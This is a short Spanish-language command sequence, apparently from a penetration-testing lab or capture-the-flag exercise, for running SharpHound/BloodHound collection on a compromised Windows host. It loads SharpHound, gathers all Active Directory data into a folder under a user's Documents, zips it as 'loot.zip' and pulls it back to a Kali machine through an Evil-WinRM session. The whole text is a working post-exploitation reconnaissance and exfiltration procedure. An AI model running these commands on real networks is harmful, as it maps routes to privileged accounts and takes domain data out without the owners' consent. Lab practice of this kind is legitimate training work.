# 1. Cargar SharpHound.ps1
```
Import-Module .\SharpHound.ps1
```
# 2. Crear carpeta para los resultados
```
mkdir C:\Users\celia.almeda\Documents\bh
```
# 3. Ejecutar la recolección y guardar en esa carpeta
```
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\celia.almeda\Documents\bh
```
# 4. Comprimir los resultados en un ZIP
```
Compress-Archive -Path C:\Users\celia.almeda\Documents\bh\*.json -DestinationPath C:\Users\celia.almeda\Documents\loot.zip
```
# 5. (En Evil-WinRM) Descargar el ZIP a tu Kali
```
download loot.zip
```
